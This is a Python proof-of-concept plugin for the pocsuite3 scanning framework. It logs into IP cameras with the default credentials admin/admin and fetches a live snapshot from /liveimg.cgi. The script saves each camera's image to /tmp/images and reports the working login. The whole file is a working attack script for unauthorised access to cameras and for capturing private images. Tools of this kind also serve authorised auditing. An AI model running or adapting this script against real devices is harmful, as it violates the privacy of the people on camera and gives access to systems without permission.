import os.path

from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests,logger)
import re
from urllib.parse import urljoin, urlparse



minimum_version_required('1.9.11')

class TestPoc(POCBase):

    def _verify(self):
        session = requests.session()
        host = re.search(r'([\w-]+\.)+\w{1,3}(:\d{1,6})?', self.url).group(0)
        creds = {
            'username':'admin',
            'password':'admin'
        }

        header = {
            'Host': f'{host}',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.95 Safari/537.36',
            'Upgrade-Insecure-Requests': '1',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
        }
        # 摄像头截图地址
        #
        url = urljoin(self.url,f'/liveimg.cgi',)
        res = session.get(self.url,auth=(creds['username'],creds['password']),headers=header)

        if res.status_code == 200:# and res.headers['Content-Type'] == 'image/jpeg':
            cookie = res.cookies
            res1 = session.get(url, auth=(creds['username'], creds['password']), headers=header,cookies=cookie)
            if res1.headers['Content-Type'] == 'image/jpeg':
                parsed = urlparse(res1.url)
                image_dir = f"/tmp/images"
                if not os.path.exists(image_dir):
                    os.makedirs(image_dir)
                filename = os.path.join(image_dir,f"{parsed.netloc.replace(':','_')}") + '.jpg'
                with open(filename,'wb') as f:
                    f.write(res1.content)
                    logger.info('save snapshot to {}'.format(filename))
                    reslut = {'VerifyInfo':{'username':creds['username'],'password':creds['password']}}
                    reslut['VerifyInfo'].update({'Url':url})
                    return self.parse_output(reslut)

register_poc(TestPoc)
